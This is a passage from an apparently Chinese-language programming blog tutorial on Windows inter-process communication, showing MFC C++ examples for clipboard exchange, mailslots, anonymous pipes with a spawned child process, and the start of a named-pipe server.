class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CCopyBoardDlg::OnBnClickedSendbutton</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//打开剪切板 成功返回TRUE</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">OpenClipboard</span>())&#123;</span><br><span class="line"><span class="comment">//打开之后首先清空剪切板</span></span><br><span class="line"><span class="built_in">EmptyClipboard</span>();</span><br><span class="line"><span class="type">char</span> *szSendBuf;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取SEND框的内容</span></span><br><span class="line">CString strSend&#123;&#125;;</span><br><span class="line"><span class="built_in">GetDlgItemText</span>(IDC_EDIT_SEND,strSend);</span><br><span class="line"></span><br><span class="line"><span class="comment">//分配一个内存对象，内存对象的句柄就是hclip</span></span><br><span class="line">HANDLE hClip = <span class="built_in">GlobalAlloc</span>(GMEM_MOVEABLE, strSend.<span class="built_in">GetLength</span>()+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//剪切板上锁</span></span><br><span class="line">szSendBuf = (<span class="type">char</span>*)<span class="built_in">GlobalLock</span>(hClip);</span><br><span class="line"><span class="built_in">strcpy</span>(szSendBuf, strSend);</span><br><span class="line"></span><br><span class="line"><span class="comment">//拷贝完之后解锁</span></span><br><span class="line"><span class="built_in">GlobalUnlock</span>(hClip);</span><br><span class="line"></span><br><span class="line"><span class="comment">//将数据放入剪切板</span></span><br><span class="line"><span class="built_in">SetClipboardData</span>(CF_TEXT, hClip);</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭剪切板</span></span><br><span class="line"><span class="built_in">CloseClipboard</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CCopyBoardDlg::OnBnClickedRecvbutton</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//打开剪切板</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">OpenClipboard</span>())&#123;</span><br><span class="line"><span class="comment">//判断剪切板是否可用</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">IsClipboardFormatAvailable</span>(CF_TEXT))&#123;</span><br><span class="line"><span class="type">char</span> *szRecvBuf;</span><br><span class="line"></span><br><span class="line"><span class="comment">//向剪切板取出数据</span></span><br><span class="line">HANDLE hClip = <span class="built_in">GetClipboardData</span>(CF_TEXT);</span><br><span class="line">szRecvBuf = (<span class="type">char</span> *)<span class="built_in">GlobalLock</span>(hClip);</span><br><span class="line"><span class="built_in">SetDlgItemText</span>(IDC_EDIT_RECV, szRecvBuf);</span><br><span class="line"><span class="built_in">GlobalUnlock</span>(hClip);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//关闭剪切板</span></span><br><span class="line"><span class="built_in">CloseClipboard</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后实现部分就是这样，在左边的内容框输入，点击发送之后，再点击接收，右边的框就有内容了</p><img src="/2022/07/21/process/009.png" class=""><p>可能会有疑惑，为什么说是同步。这个程序看似就是一个进程之间的事情。<br>实际上因为我们调用了剪切板，所以当我们点击发送的时候，我们系统的剪切板就有了内容，所以我们可以直接在别的地方粘贴出来。<br>就像这样，我可以直接在项目的源文件中粘贴出来。</p><img src="/2022/07/21/process/011.png" class=""><p>当然也可以新建一个作为桥梁嘛。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CCopyBoardCliDlg::OnBnClickedButtonrecv</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//打开剪切板</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">OpenClipboard</span>())&#123;</span><br><span class="line"><span class="comment">//判断是否可用</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">IsClipboardFormatAvailable</span>(CF_TEXT))&#123;</span><br><span class="line"><span class="type">char</span> *szRecvBuf;</span><br><span class="line"></span><br><span class="line"><span class="comment">//取剪切板数据</span></span><br><span class="line">HANDLE hClip = <span class="built_in">GetClipboardData</span>(CF_TEXT);</span><br><span class="line">szRecvBuf = (<span class="type">char</span> *)<span class="built_in">GlobalLock</span>(hClip);</span><br><span class="line"><span class="built_in">SetDlgItemText</span>(IDC_EDITRECV, szRecvBuf);</span><br><span class="line"><span class="built_in">GlobalUnlock</span>(hClip);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//关闭剪切板</span></span><br><span class="line"><span class="built_in">CloseClipboard</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>额老样子一个直接打开一个vs打开。</p><img src="/2022/07/21/process/012.png" class=""><p>效果就是我主要的点了发送以后，新写的可以直接通过接收获取。不是视频可能会有理解上的偏差。</p><hr><h2 id="邮槽"><a href="#邮槽" class="headerlink" title="邮槽"></a>邮槽</h2><p>邮槽是比较老的通信方式了。<br>使用邮槽的进程分为服务端和客户端。邮槽由服务端创建，在创建时需要指定邮槽名，创建后服务端得到邮槽的句柄。在邮槽创建后，客户端可以通过邮槽名打开邮槽，在获得句柄后可以向邮槽写入消息。<br>邮槽通信是单项的，只有服务端才能从邮槽中读取消息，客户端只能写入消息。消息遵循先入先出的原则。客户端先写入的消息在服务端现被读取。<br>通过邮槽通信的数据可以是任意格式，但是一条消息不能大于424字节。<br>邮槽除了在本机内进行进程间通信外，在主机间也可以通信。但是在主机间进行邮槽通信。数据通过网络传播时使用的是数据报协议(UDP)，所以是一种不可靠的通信。通过网络进行邮槽通信时，客户端必须知道服务端的主机名或者域名。</p><p><code>CreateMailslot</code>额，还是老样子微软会根据多字节还是Unicode会做一个区分，前者多个a，后者多个w。<br>其原型</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CreateMailslot</span>(</span><br><span class="line">    _In_     LPCWSTR lpName,</span><br><span class="line">    _In_     DWORD nMaxMessageSize,</span><br><span class="line">    _In_     DWORD lReadTimeout,</span><br><span class="line">    _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><img src="/2022/07/21/process/013.png" class=""><img src="/2022/07/21/process/014.png" class=""><p>然后设计这么两个东西。</p><p>先从服务器开始设计接收</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyMailslotDlg::OnBnClickedRecvbutton</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//创建邮槽</span></span><br><span class="line">LPCTSTR szSlotName = <span class="built_in">TEXT</span>(<span class="string">&quot;\\\\.\\mailslot\\Mymailslot&quot;</span>);</span><br><span class="line">HANDLE hSlot = <span class="built_in">CreateMailslot</span>(</span><br><span class="line">szSlotName,</span><br><span class="line"><span class="number">0</span>,<span class="comment">//消息大小</span></span><br><span class="line">MAILSLOT_WAIT_FOREVER,<span class="comment">//阻塞时间</span></span><br><span class="line"><span class="literal">NULL</span><span class="comment">//安全属性</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hSlot == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;CreateMailslot failed with %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后要读取数据<br>这一关键点需要用到一个特别的函数<code>ReadFile</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ReadFile</span>(</span><br><span class="line">    _In_ HANDLE hFile,<span class="comment">//句柄</span></span><br><span class="line">    _Out_writes_bytes_to_opt_(nNumberOfBytesToRead, *lpNumberOfBytesRead) <span class="comment">//缓冲区</span></span><br><span class="line"></span><br><span class="line">__out_data_source(FILE) LPVOID lpBuffer,</span><br><span class="line">    _In_ DWORD nNumberOfBytesToRead,<span class="comment">//将要读取的最大字节数</span></span><br><span class="line">    _Out_opt_ LPDWORD lpNumberOfBytesRead,<span class="comment">//指针，该变量接收时同步hFile读取的字节数</span></span><br><span class="line">    _Inout_opt_ LPOVERLAPPED lpOverlapped<span class="comment">//默认NULL</span></span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>完整的这个服务端接收功能</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyMailslotDlg::OnBnClickedRecvbutton</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//创建邮槽</span></span><br><span class="line">LPCTSTR szSlotName = <span class="built_in">TEXT</span>(<span class="string">&quot;\\\\.\\mailslot\\Mymailslot&quot;</span>);</span><br><span class="line">HANDLE hSlot = <span class="built_in">CreateMailslot</span>(</span><br><span class="line">szSlotName,</span><br><span class="line"><span class="number">0</span>,<span class="comment">//消息大小</span></span><br><span class="line">MAILSLOT_WAIT_FOREVER,<span class="comment">//阻塞时间</span></span><br><span class="line"><span class="literal">NULL</span><span class="comment">//安全属性</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hSlot == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;CreateMailslot failed with %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//读数据</span></span><br><span class="line"><span class="type">char</span> szBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD dwRead;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">ReadFile</span>(hSlot, szBuf, <span class="number">100</span>, &amp;dwRead, <span class="literal">NULL</span>))&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="string">&quot;ReadFile error!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;---dwRead = %d\n&quot;</span>, dwRead);</span><br><span class="line"><span class="built_in">MessageBox</span>(szBuf);</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hSlot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后客户端的发送功能其实也挺类似</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMymailCliDlg::OnBnClickedSendbutton</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//创建句柄</span></span><br><span class="line">LPCTSTR szSlotName = <span class="built_in">TEXT</span>(<span class="string">&quot;\\\\.\\mailslot\\Mymailslot&quot;</span>);</span><br><span class="line">HANDLE hMailSlot = <span class="built_in">CreateFile</span>(</span><br><span class="line">szSlotName,</span><br><span class="line">FILE_GENERIC_WRITE,</span><br><span class="line">FILE_SHARE_READ,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">OPEN_EXISTING,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hMailSlot == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;CreateFile failed with %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//写入数据</span></span><br><span class="line"><span class="type">char</span> szBuf[<span class="number">100</span>] = <span class="string">&quot;MailSlot Comming&quot;</span>;</span><br><span class="line">DWORD dwWrite;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">WriteFile</span>(hMailSlot, szBuf, <span class="built_in">strlen</span>(szBuf)+<span class="number">1</span>, &amp;dwWrite, <span class="literal">NULL</span>))&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="string">&quot;Write Error!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭句柄</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(hMailSlot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/21/process/015.png" class=""><p>按照这个顺序大致就是这个效果。</p><blockquote><p>邮槽用的不多，之前可以说是听都没听过</p></blockquote><hr><h2 id="匿名管道"><a href="#匿名管道" class="headerlink" title="匿名管道"></a>匿名管道</h2><p>匿名管道是一个没有命名的单向管道，本质上是一个共享的内存区域。通常用来在父进程和子进程之间通信。<br>只能实现本地两个进程之间的通信，不能实现网络通信。</p><p><code>CreatePipe</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CreatePipe</span>(</span><br><span class="line">    _Out_ PHANDLE hReadPipe,</span><br><span class="line">    _Out_ PHANDLE hWritePipe,</span><br><span class="line">    _In_opt_ LPSECURITY_ATTRIBUTES lpPipeAttributes,</span><br><span class="line">    _In_ DWORD nSize</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>额这里因为是要用到两个进程，就直接在邮槽上改了。</p><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hReadPipe;<span class="comment">//读句柄</span></span><br><span class="line">HANDLE hWritePipe;<span class="comment">//写句柄</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyMailslotDlg::OnBnClickedSendbutton</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">char</span> szBuf[] = <span class="string">&quot;This Server Pipe&quot;</span>;</span><br><span class="line">DWORD dwWrite;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">WriteFile</span>(hWritePipe, szBuf, <span class="built_in">strlen</span>(szBuf) + <span class="number">1</span>, &amp;dwWrite, <span class="literal">NULL</span>))&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;写入数据失败&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyMailslotDlg::OnBnClickedRecvbutton</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">char</span> szBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD dwRead;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;Begin ReadFile&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">ReadFile</span>(hReadPipe, szBuf, <span class="number">100</span>, &amp;dwRead, <span class="literal">NULL</span>))&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;读取数据失败&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;End PipeReadFile&quot;</span>);</span><br><span class="line"><span class="built_in">MessageBox</span>(szBuf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMyMailslotDlg::OnBnClickedCreBtn</span><span class="params">()</span></span>&#123;</span><br><span class="line">SECURITY_ATTRIBUTES sa;</span><br><span class="line">sa.bInheritHandle = TRUE;</span><br><span class="line">sa.lpSecurityDescriptor = <span class="literal">NULL</span>;</span><br><span class="line">sa.nLength = <span class="built_in">sizeof</span>(SECURITY_ATTRIBUTES);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">CreatePipe</span>(&amp;hReadPipe, &amp;hWritePipe, &amp;sa, <span class="number">0</span>))&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;匿名管道创建失败&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建子进程</span></span><br><span class="line">STARTUPINFO strStartupInfo;<span class="comment">//用来指定新进程窗口如何显示</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;strStartupInfo, <span class="number">0</span>, <span class="built_in">sizeof</span>(strStartupInfo));</span><br><span class="line">strStartupInfo.cb = <span class="built_in">sizeof</span>(strStartupInfo);</span><br><span class="line">strStartupInfo.dwFlags = STARTF_USESTDHANDLES;</span><br><span class="line">strStartupInfo.hStdInput = hReadPipe;</span><br><span class="line">strStartupInfo.hStdOutput = hWritePipe;</span><br><span class="line">strStartupInfo.hStdError = <span class="built_in">GetStdHandle</span>(STD_ERROR_HANDLE);</span><br><span class="line"></span><br><span class="line">PROCESS_INFORMATION szProcessInformation;</span><br><span class="line"><span class="built_in">memset</span>(&amp;szProcessInformation, <span class="number">0</span>, <span class="built_in">sizeof</span>(szProcessInformation));</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> iRet = <span class="built_in">CreateProcess</span>(</span><br><span class="line">_T(<span class="string">&quot;MymailCli.exe&quot;</span>),</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">TRUE,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">&amp;strStartupInfo,</span><br><span class="line">&amp;szProcessInformation</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (iRet)&#123;</span><br><span class="line"><span class="comment">//创建成功的情况</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(szProcessInformation.hProcess);</span><br><span class="line"><span class="built_in">CloseHandle</span>(szProcessInformation.hThread);</span><br><span class="line">szProcessInformation.dwProcessId = <span class="number">0</span>;</span><br><span class="line">szProcessInformation.dwThreadId = <span class="number">0</span>;</span><br><span class="line">szProcessInformation.hThread = <span class="literal">NULL</span>;</span><br><span class="line">szProcessInformation.hProcess = <span class="literal">NULL</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hReadPipe);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hWritePipe);</span><br><span class="line">hReadPipe = <span class="literal">NULL</span>;</span><br><span class="line">hWritePipe = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;子进程创建失败&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里主要是给服务端拉起一个进程，然后通过拉起的客户端进行匿名管道传递<br>进程的代码大多还是抄之前写的进程部分。</p><img src="/2022/07/21/process/016.png" class=""><hr><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hReadPipe;<span class="comment">//读句柄</span></span><br><span class="line">HANDLE hWritePipe;<span class="comment">//写句柄</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMymailCliDlg::OnBnClickedSendbutton</span><span class="params">()</span></span>&#123;</span><br><span class="line">hWritePipe = <span class="built_in">GetStdHandle</span>(STD_OUTPUT_HANDLE);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> szBuf[<span class="number">100</span>] = <span class="string">&quot;This Client Pipe&quot;</span>;</span><br><span class="line">DWORD dwWrite;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">WriteFile</span>(hWritePipe, szBuf, <span class="built_in">strlen</span>(szBuf) + <span class="number">1</span>, &amp;dwWrite, <span class="literal">NULL</span>))&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;写入数据失败&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMymailCliDlg::OnBnClickedRecvbutton</span><span class="params">()</span></span>&#123;</span><br><span class="line">hReadPipe = <span class="built_in">GetStdHandle</span>(STD_INPUT_HANDLE);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> szBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD dwRead;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">ReadFile</span>(hReadPipe, szBuf, <span class="number">100</span>, &amp;dwRead, <span class="literal">NULL</span>))&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;读取数据失败&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">MessageBox</span>(szBuf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端因为不用管邮槽先，就通过句柄传送。</p><hr><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><img src="/2022/07/21/process/017.png" class=""><p>根据按钮打开新进程。</p><p>然后相互点击发送和接收<br>服务端发送 客户端接收</p><img src="/2022/07/21/process/018.png" class=""><p>客户端发送 服务端接收</p><img src="/2022/07/21/process/019.png" class=""><p>大致就是这么一个效果。</p><p><strong>继续插一嘴：匿名管道只能实现本地两个进程之间的通信，不能实现网络通信。</strong></p><hr><h2 id="命名管道"><a href="#命名管道" class="headerlink" title="命名管道"></a>命名管道</h2><p>与Socket相似，支持网络之间不同进程的通信<br>既然也能通信，自然也能通过c&#x2F;s模式实现</p><p><code>CreateNamePipe</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CreateNamedPipeA</span>(</span><br><span class="line">    _In_     LPCSTR lpName,</span><br><span class="line">    _In_     DWORD dwOpenMode,</span><br><span class="line">    _In_     DWORD dwPipeMode,</span><br><span class="line">    _In_     DWORD nMaxInstances,</span><br><span class="line">    _In_     DWORD nOutBufferSize,</span><br><span class="line">    _In_     DWORD nInBufferSize,</span><br><span class="line">    _In_     DWORD nDefaultTimeOut,</span><br><span class="line">    _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>插一句，项目有些时候都用多字节的，Unicode有的时候要转换太麻烦了。</p><h3 id="服务端-1"><a href="#服务端-1" class="headerlink" title="服务端"></a>服务端</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hNamedPipe;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CmyNamePipeSerDlg::OnBnClickedProBtn</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//创建命名管道</span></span><br><span class="line">LPCTSTR szPipeName = <span class="built_in">TEXT</span>(<span class="string">&quot;\\\\.\\pipe\\mypipe&quot;</span>);</span><br><span class="line">hNamedPipe = <span class="built_in">CreateNamedPipe</span>(</span><br><span class="line">szPipeName,</span><br><span class="line">PIPE_ACCESS_DUPLEX | 